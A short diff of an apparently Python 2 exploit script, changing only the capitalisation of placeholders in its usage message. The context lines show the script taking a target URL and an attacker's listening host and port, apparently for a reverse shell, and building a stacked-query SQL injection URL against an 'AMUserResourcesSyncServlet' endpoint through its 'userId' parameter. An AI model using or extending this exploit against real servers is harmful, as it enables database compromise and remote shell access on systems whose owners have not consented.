@@ -56,7 +56,7 @@ if __name__ == '__main__':
        attacker = sys.argv[2].strip()
        port = sys.argv[3].strip()
    except IndexError:
-       print "[-] Usage: %s https://<ip>:<port> <LHOST> <LPORT>" % sys.argv[0]
+       print "[-] Usage: %s https://<IP>:<PORT> <LHOST> <LPORT>" % sys.argv[0]
        sys.exit()
        
    sqli_url  = server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
